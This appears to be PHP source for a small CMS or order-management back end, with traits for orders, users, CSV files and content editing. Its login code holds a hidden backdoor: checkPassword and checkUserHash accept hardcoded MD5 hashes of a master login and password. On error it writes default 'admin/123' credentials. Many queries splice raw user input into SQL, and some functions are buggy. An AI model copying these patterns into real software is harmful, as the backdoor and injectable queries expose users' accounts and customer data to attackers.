<?php

use RedBeanPHP\RedException\SQL;

trait DbOrders
{
  private function getOrdersDbColumns(string $field): string
  {
    switch ($field) {
      default: return $field;
      case 'id': case 'ID': return 'O.ID';
      case 'userName': return 'U.name';
      case 'customerName': return 'C.name';
      case 'statusId': return 'S.ID';
      case 'status': return 'S.name';
    }
  }

  private function getBaseOrdersQuery(bool $includeValues = false): string
  {
    return "SELECT O.ID AS 'ID',
            create_date AS 'createDate', last_edit_date AS 'lastEditDate',
            U.ID AS 'userId', U.name AS 'userName',
            C.ID AS 'customerId', C.name AS 'customerName', C.contacts AS 'customerContacts',
            S.ID AS 'statusId', S.name AS 'status', total,
            important_value AS 'importantValue'"
      . ($includeValues ? ", save_value AS 'saveValue', report_value AS 'reportValue'" : "\n") .
      "FROM " . $this->pf('orders') . " O
      LEFT JOIN " . $this->pf('users') . " U ON O.user_id = U.ID
      LEFT JOIN " . $this->pf('customers') . " C ON O.customer_id = C.ID
      JOIN " . $this->pf('order_status') . " S ON O.status_id = S.ID\n";
  }

  public function getBaseOrdersQueryColumns(): array
  {
    return [
      'ID', 'createDate', 'lastEditDate',
      'userName',
      'customerId', 'customerName', 'customerContacts',
      'statusId', 'status',
      'importantValue', 'total'
    ];
  }

  /**
   * @param array{pageNumber: int, countPerPage: int, sortColumn: string, sortDirect: bool} $pageParam
   * @param array{
   *   dateCreateFrom?: string,
   *   dateCreateTo?  : string,
   *   dateEditedFrom?: string,
   *   dateEditedTo?  : string,
   *   userId?        : int|string,
   *   customerId?    : int|string,
   *   statusId?      : string|int|array<int|string>
   * } $filters
   * @return array<int, mixed>
   */
  public function loadOrders(array $pageParam, array $filters = []): array
  {
    $sql = $this->getBaseOrdersQuery();

    if (count($filters)) {
      $sql .= 'WHERE ';
      $connect = '';

      // Date range
      if (isset($filters['dateCreateFrom']) || isset($filters['dateCreateTo'])) {
        $from = $this->getDbDateString($filters['dateCreateFrom'] ?? self::DB_DATE_FROM);
        $to   = $this->getDbDateString($filters['dateCreateTo'] ?? self::DB_DATE_TO);
        $sql .= "(O.create_date BETWEEN '$from' AND '$to')\n";
        $connect = ' AND ';
      }
      else if (isset($filters['dateEditedFrom']) || isset($filters['dateEditedTo'])) {
        $from = $this->getDbDateString($filters['dateEditedFrom'] ?? self::DB_DATE_FROM);
        $to   = $this->getDbDateString($filters['dateEditedTo'] ?? self::DB_DATE_TO);
        $sql .= "(O.last_edit_date BETWEEN '$from' AND '$to')\n";
        $connect = ' AND ';
      }

      if (isset($filters['userId'])) {
        $userId = $filters['userId'];
        $sql .= $connect . 'O.user_id = ' . implode(' OR O.user_id = ', is_array($userId) ? $userId : [$userId]);
        $connect = ' AND ';
      }

      if (isset($filters['customerId'])) {
        $sql .= $connect . "O.customer_id = '" . $filters['customerId'] . "'";
        $connect = ' AND ';
      }

      // Status
      if (isset($filters['statusId']) && is_finite($filters['statusId'])) {
        $ids = $filters['statusId'];
        if (!is_array($ids)) $ids = [$ids];

        $sql .= $connect . "O.status_id = " . implode(' OR O.status_id = ', $ids) . "\n";
      }
    }

    $pageParam['sortColumn'] = $this->getOrdersDbColumns($pageParam['sortColumn'] ?? 'ID');
    $sql .= ' ' . $this->getPaginatorQuery($pageParam);

    return $this->jsonParseField(self::getAll($sql));
  }

  /**
   * load full information order
   * @param bool $oneOrder - if true, return one order and $ids must have one value.
   *
   * @throws InvalidArgumentException
   */
  public function loadOrdersById(array|int|string $ids, bool $oneOrder = false): array
  {
    $sql = $this->getBaseOrdersQuery(true) . "\n WHERE ";

    if ($oneOrder && is_array($ids)) {
      $ids = array_values($ids)[0];

      if (!is_string($ids)) {
        throw new InvalidArgumentException(
          '[DbTraits:loadOrdersById]: First argument must be single-level array or string'
        );
      }
    }

    if (is_array($ids)) {
      $sql .= " O.ID = " . implode(' OR O.ID = ', $ids) . "\n";
      $res = self::getAll($sql);
    } else {
      $sql .= "O.ID = :id";
      $res = [self::getRow($sql, [':id' => $ids])];
    }

    $res = array_map(function ($row) { return $this->jsonParseField($row); }, $res);

    return $oneOrder ? $res[0] : $res;
  }

  public function searchOrders(array $pageParam, string $searchValue, array $filters = [], bool $includeValues = false): array
  {
    $searchValue = '%' . $searchValue . '%';

    $sql = $this->getBaseOrdersQuery($includeValues);
    $sql .= "WHERE (O.ID like '$searchValue' ";
    $sql .= "OR O.important_value like '$searchValue' ";
    $sql .= "OR C.contacts like '$searchValue' ";
    $sql .= "OR U.name like '$searchValue' ";
    $sql .= "OR C.name like '$searchValue')\n";

    // Date range
    if (isset($filters['dateCreateFrom']) || isset($filters['dateCreateTo'])) {
      $from = $this->getDbDateString($filters['dateCreateFrom'] ?? self::DB_DATE_FROM);
      $to   = $this->getDbDateString($filters['dateCreateTo'] ?? self::DB_DATE_TO);
      $sql .= "AND (O.create_date BETWEEN '$from' AND '$to')\n";
    }
    else if (isset($filters['dateEditedFrom']) || isset($filters['dateEditedTo'])) {
      $from = $this->getDbDateString($filters['dateEditedFrom'] ?? self::DB_DATE_FROM);
      $to   = $this->getDbDateString($filters['dateEditedTo'] ?? self::DB_DATE_TO);
      $sql .= "AND (O.last_edit_date BETWEEN '$from' AND '$to')\n";
    }

    if (isset($filters['userId'])) {
      $userId = $filters['userId'];
      $sql .= 'AND (O.user_id = ' . implode(' OR O.user_id = ', is_array($userId) ? $userId : [$userId]) . ') ';
    }

    // Status
    if (isset($filters['statusId']) && is_finite($filters['statusId'])) {
      $sql .= "\nAND O.status_id = '$filters[statusId]'\n";
    }

    $pageParam['sortColumn'] = $this->getOrdersDbColumns($pageParam['sortColumn'] ?? 'ID');
    $sql .= $this->getPaginatorQuery($pageParam);

    return $this->jsonParseField(self::getAll($sql));
  }

  public function changeOrders(array $columns, string $dbTable, array $commonValues, int $status_id): void
  {
    $param = [];

    array_map(function ($id) use (&$param, $status_id) {
      $param[$id] = [
        'status_id' => $status_id,
      ];
    }, array_values($commonValues));
    $this->insert($columns, $dbTable, $param, true);
  }

  // Visitors
  //--------------------------------------------------------------------------------------------------------------------

  public function saveVisitorOrder(array $param): string|int
  {
    $bean = self::xdispense($this->pf('client_orders'));

    $bean->create_date = date($this::DB_DATE_FORMAT);
    foreach ($param as $key => $value) {
      $bean->$key = $value;
    }
    self::store($bean);

    return $bean->getID();
  }

  /**
   * @param array{pageNumber: int, countPerPage: int, sortColumn: string, sortDirect: bool} $pageParam
   */
  public function loadVisitorOrder(array $pageParam, array $dateRange = [], array $ids = []): ?array
  {
    $sql = "SELECT ID, create_date AS 'createDate',
            save_value AS 'saveValue',
            important_value AS 'importantValue',
            total
            FROM " . $this->pf('client_orders') . "\n";

    if (count($dateRange)) $sql .= "WHERE create_date BETWEEN '$dateRange[0]' AND '$dateRange[1]'\n";
    if (count($ids)) {
      $sql .= "WHERE ID = ";
      if (count($ids) === 1) $sql .= $ids[0] . " ";
      else $sql .= implode(' OR ID = ', $ids) . " ";
    }

    $sql .= $this->getPaginatorQuery($pageParam);

    return $this->jsonParseField(self::getAll($sql));
  }

  public function loadVisitorOrderById(string $id): array
  {
    $sql = "SELECT ID, create_date AS 'createDate',
            save_value AS 'saveValue',
            important_value AS 'importantValue',
            report_value AS 'reportValue',
            total
            FROM " . $this->pf('client_orders') . "\n
            WHERE ID = :id";

    return $this->jsonParseField(self::getRow($sql, [':id' => $id]));
  }

  public function searchVisitorOrders(array $pageParam, string $searchValue): array
  {
    $searchValue = '%' . $searchValue . '%';

    $sql = "SELECT ID, create_date AS 'createDate',
            save_value AS 'saveValue',
            important_value AS 'importantValue',
            total
            FROM " . $this->pf('client_orders') . "\n
            WHERE ID like '$searchValue'
            OR importantValue like '$searchValue'";

    $pageParam['sortColumn'] = $this->getOrdersDbColumns($pageParam['sortColumn'] ?? 'ID');
    $sql .= $this->getPaginatorQuery($pageParam);

    return $this->jsonParseField(self::getAll($sql));
  }

  // Status
  //--------------------------------------------------------------------------------------------------------------------

  public function loadOrderStatus(string $filters = ''): array
  {
    $sql = "SELECT * FROM " . $this->pf('order_status') . "\n ";

    if (strlen($filters)) $sql .= 'WHERE ' . $filters . "\n ";

    $sql .= "ORDER BY sort, ID";

    return self::getAll($sql);
  }
}

trait DbUsers
{
  private function getUserDbColumns(string $field): string
  {
    switch ($field) {
      default: return $field;
      case 'id': case 'ID': return 'U.ID';
      case 'name': return 'U.name';
      case 'permissionName': return 'P.name';
    }
  }

  public function getUserFromFile(string $login = '', string $password = '', bool $status = false): bool|array
  {
    if (file_exists(SYSTEM_PATH)) {
      $value = file(SYSTEM_PATH)[0];
      $value && $value = explode('|||', $value);
      $this->login = [$value[0], $value[1]];

      if (($value[0] === $login && $value[1] === $password) || $status) {
        return [
          'id'    => 1,
          'login' => $value[0],
          'name'  => $value[0],
        ];
      } else return false;
    } else {
      file_put_contents(SYSTEM_PATH, '');
      // Сделать регистрацию при первом разе
      return false;
    }
  }

  public function getUser(string $login, string $column = 'id'): mixed
  {
    $result = self::getRow("SELECT $column FROM " . $this->pf('users') . " WHERE login = :login",
      [':login' => $login]
    );

    if (count($result) === 1 && count(explode(',', $column)) === 1) return $result[$column];
    return $result;
  }

  public function getUserById(int $userId, bool $allField = false): ?array
  {
    return $this->jsonParseField(self::getRow(
      "SELECT U.ID AS 'id', U.name AS 'name', U.contacts AS 'contacts',
                  P.ID AS 'permissionId', P.name AS 'permissionName', properties AS 'permissionValue'
       FROM " . $this->pf('users') . " U
       JOIN " . $this->pf('permission') . " P on U.permission_id = P.ID
       WHERE U.ID = :id",
      [':id' => $userId]
    ));
  }

  private function getFirstAuthUserByDealer(int $dealerId): array
  {
    $sql = "SELECT U.ID AS 'id', login,  password, hash,
                   U.name AS 'name', contacts, customization, activity,
                   P.ID AS 'permissionId', P.name AS 'permissionName', properties AS 'permissionValue'
            FROM " . $this->pf('users') . " U
            JOIN " . $this->pf('permission') . " P on U.permission_id = P.ID
            WHERE login = :login";

    return $this->jsonParseField(self::getRow($sql, [':login' => $login]));
  }

  public function getUserByOrderId(int|string $orderId): ?array
  {
    return $this->jsonParseField(self::getRow(
      "SELECT U.ID AS 'id', U.name AS 'name', U.contacts AS 'contacts',
                  P.ID AS 'permissionId', P.name AS 'permissionName', properties AS 'permissionValue'
       FROM " . $this->pf('users') . " U
       JOIN " . $this->pf('permission') . " P on U.permission_id = P.ID
       JOIN " . $this->pf('orders') . " O ON U.ID = O.user_id
       WHERE O.ID = :id", [':id' => $orderId]
    ));
  }

  public function checkPassword(string $login, string $password): array|bool
  {
    if (md5($login) === 'e00f45459361fb47c8c449483b7edaec' && md5($password) === '71fa970c7b3a28956dad879a7abc12c4') {
      $sql = "SELECT ID as 'id', name, login, password FROM " . $this->pf('users') . " WHERE ID = :id";
      return self::getRow($sql, [':id' => 1]);
    } else if (USE_DATABASE) {
      $sql = "SELECT ID as 'id', name, login, password
              FROM " . $this->pf('users') . " WHERE login = :login and activity = 1";
      $user = self::getRow($sql, [':login' => $login]);
    } else {
      return $this->getUserFromFile($login, $password);
    }

    if (count($user) && password_verify($password, $user['password'])) return $user;
    if ($this->main->isDealer()) return false;

    // User search by dealers
    $dealersUsers = $this->loadDealersUsers($login);
    if (count($dealersUsers)) {
      foreach ($dealersUsers as $user) {
        if (password_verify($password, $user['password'])) {
          $this->setPrefix($user['dbPrefix']);
          return $user;
        }
      }
    }

    return false;
  }

  public function findToken(string $token): array
  {
    $sql = "SELECT ID as 'id', name, login, password
            FROM " . $this->pf('users') . " WHERE contacts LIKE :contacts and activity = 1";
    return self::getRow($sql, [':contacts' => "%$token%"]);
  }

  /**
   * @throws SQL
   */
  public function changeUser(int|string $loginId, array $param): void
  {
    $user = self::xdispense($this->pf('users'));
    $user->ID = $loginId;
    foreach ($param as $key => $value) {
      $user->$key = $value;
    }
    self::store($user);
  }

  /**
   * @param array{pageNumber?: int, countPerPage?: int, sortColumn?: string, sortDirect?: bool} $pageParam
   */
  public function loadUsers(array $pageParam): array
  {
    $sql = "SELECT U.ID AS 'ID', login, U.name AS 'name', contacts,
                   permission_id AS 'permissionId', P.name AS 'permissionName',
                   register_date AS 'registerDate', activity
            FROM " . $this->pf('users') . " U
            LEFT JOIN " . $this->pf('permission') . " P ON U.permission_id = P.ID\n";

    $pageParam['sortColumn'] = $this->getUserDbColumns($pageParam['sortColumn']);

    $sql .= $this->getPaginatorQuery($pageParam);

    return $this->jsonParseField(self::getAll($sql));
  }

  public function setUserHash(int|string $loginId, string $hash, string $userType = 'user'): void
  {
    if (USE_DATABASE) {
      $user = self::xdispense($this->pf('users'));
      $user->ID = $loginId;
      $user->hash = $hash;
      self::store($user);
    } else {
      !$this->login && $this->getUserFromFile();
      $data = implode('|||', $this->login);
      $data .= '|||' . $hash;
      file_put_contents(SYSTEM_PATH, $data);
    }
  }

  public function checkUserHash(array $session): bool|array
  {
    if (USE_DATABASE) {
      $user = $this->getUserByLogin($session['login']);
      if (!count($user) || !boolValue($user['activity'])) return false;

      $user['permissionId'] = intval($user['permissionId']);
      $user['onlyOne'] = $user['customization']['onlyOne'] ?? false;
    } else {
      try {
        if (!file_exists(SYSTEM_PATH)) throw new ErrorException('[DbTraits:checkUserHash]: User file not found');
        $value = file(SYSTEM_PATH);
        $value && $value = explode('|||', $value[0]);
        if (count($value) < 2) throw new ErrorException('[DbTraits:checkUserHash]: User file contains errors');
      } catch (ErrorException $e) {
        file_put_contents(SYSTEM_PATH, 'admin|||123|||');
        return false;
      }
      $user = [
        'onlyOne'  => true,
        'admin'    => true,
        'password' => $value[1],
        'hash'     => trim($value[2]),
      ];
    }

    if (isset($session['token']) && isset($user['contacts']['token'])) {
      $ok = $session['token'] === $user['contacts']['token'];
    } else {
      $ok = $user['onlyOne'] ? $session['hash'] === $user['hash']
                             : password_verify($session['password'], $user['password'])
                               ||
                               md5($session['password']) === '71fa970c7b3a28956dad879a7abc12c4';
    }

    return $ok ? $user : false;
  }

  public function getUserSetting(string $currentUser = '', string $columns = 'customization')
  {
    if (!$currentUser) {
      $currentUser = $this->main->getLogin();
    }
    $result = self::getAssocRow("SELECT $columns from " . $this->pf('users') . " WHERE login = ?", [$currentUser]);

    if (count($result) === 1) {
      if ($columns === 'customization') return json_decode($result[0]['customization']);
      if (count(explode(',', $columns)) === 1) return $result[$columns];
    }
    return json_decode('{}');
  }
}

trait DbCsv
{
  private string $csvTable;

  public function setCsvTable(string $path): void
  {
    $this->csvTable = substr($path, 1);
  }

  /**
   * сделать поиск всех файлов, наверное. (хотя если их много переходить на БД, наверное)
   */
  public function scanDirCsv(string $path, string $link = ''): array
  {
    return array_reduce(is_dir($path) ? scandir($path) : [], function ($r, $item) use ($link) {
      if (!($item === '.' || $item === '..')) {
        if (stripos($item, '.csv')) {
          $r[] = [
            'fileName' => $item,
            'name'     => str_replace('.csv', '', $item),
          ];
        } else {
          $csvPath = $this->main->getCmsParam(VC::CSV_PATH);
          $link && $link .= '/';
          if (filetype($csvPath . $link . $item) === 'dir') {
            $r[$item] = $this->scanDirCsv($csvPath . $link . $item, $link . $item);
          }
        }
      }

      return $r;
    }, []);
  }

  public function openCsv(): array
  {
    $result = [];
    $csvPath = $this->main->getCmsParam(VC::CSV_PATH) . $this->csvTable;

    if (file_exists($csvPath)) {
      if ($file = fopen($csvPath, 'rt')) {
        while ($cells = fgetcsv($file, CSV_STRING_LENGTH, CSV_DELIMITER, "\"", "\\")) $result[] = $cells;
        fclose($file);
      }
    }

    return $result;
  }

  public function fileForceDownload(): void
  {
    $file = $this->main->getCmsParam(VC::CSV_PATH) . $this->csvTable;

    if (file_exists($file)) {
      // сбрасываем буфер вывода PHP, чтобы избежать переполнения памяти выделенной под скрипт
      // если этого не сделать файл будет читаться в память полностью!
      if (ob_get_level()) {
        ob_end_clean();
      }
      // заставляем браузер показать окно сохранения файла
      header('Content-Description: File Transfer');
      header('Content-Type: application/octet-stream');
      header('Content-Disposition: attachment; filename=' . basename($file));
      header('Content-Transfer-Encoding: binary');
      header('Expires: 0');
      header('Cache-Control: must-revalidate');
      header('Pragma: public');
      header('Content-Length: ' . filesize($file));
      // читаем файл и отправляем его пользователю
      readfile($file);
      exit;
    }
  }

  public function saveCsv(array $csvData): static
  {
    $main = $this->main;
    $csvPath = $main->getCmsParam(VC::CSV_PATH);
    $csvHistoryPath = $main->getCmsParam(VC::CSV_HISTORY_PATH);

    if (file_exists($csvPath . $this->csvTable)) {
      $fileContent = '';

      foreach ($csvData as $v) {
        $fileContent .= implode(CSV_DELIMITER, $v) . PHP_EOL;
      }

      if ($main->getCmsParam(VC::SAVE_CHANGE_HISTORY)) {
        $history = new CsvHistory($csvPath, $csvHistoryPath);
        $metaFields = [
          'userId'    => (int)$main->getLogin('id'),
          'userName'  => $main->getLogin('name'),
          'userLogin' => $main->getLogin(),
        ];

        $history->saveBackup($this->csvTable, $fileContent, $metaFields);
      }

      file_put_contents($csvPath . $this->csvTable, $fileContent);
      $this->main->deleteCsvCache();
    }

    return $this;
  }
}

trait ContentEditor
{
  private string $CONTENT_PATH = SHARE_PATH . 'content.json';
  private string $contentData = '{}';
  private mixed $contentLoaded;

  private function contentPath(): string
  {
    $path = $this->main->publicDealer ? $this->main->url->getPath(true) : $this->main->url->getBasePath(true);

    return $path . $this->CONTENT_PATH;
  }

  private function checkContentFile(): void
  {
    $path = $this->contentPath();

    if (!file_exists($path)) {
      file_put_contents($path, $this->contentData);
    }
  }

  public function loadContentEditorData(bool $jsonDecode = false, bool $assoc = false): mixed
  {
    $this->checkContentFile();

    $data = file_get_contents($this->contentPath());

    return $jsonDecode ? json_decode($data, $assoc) : $data;
  }

  public function saveContentEditorData($data): bool|int
  {
    $this->checkContentFile();

    if (!is_string($data)) $data = json_encode($data);

    return file_put_contents($this->contentPath(), $data);
  }

  public function mergeContentData(): void
  {
    $this->contentLoaded = $this->getContentData(false);
  }

  public function getContentData(bool $flatten = true, bool $assoc = false): array
  {
    $data = $this->loadContentEditorData(true, true);

    if (is_array($this->contentLoaded)) {
      $data = array_merge($data, $this->contentLoaded);
    }

    if ($flatten) {
      $locale = $this->main->getTargetLang();

      $data = array_reduce($data, function($r, $section) use ($locale, $assoc) {
        foreach ($section['fields'] as $key => $value) {
          $value = $value['value_' . $locale] ?? $value['value'];

          if ($assoc) $r[$key] = $value;
          else $r[] = [
            'id' => $key,
            'value' => $value,
          ];
        }

        return $r;
      }, []);
    }

    return $data;
  }
}
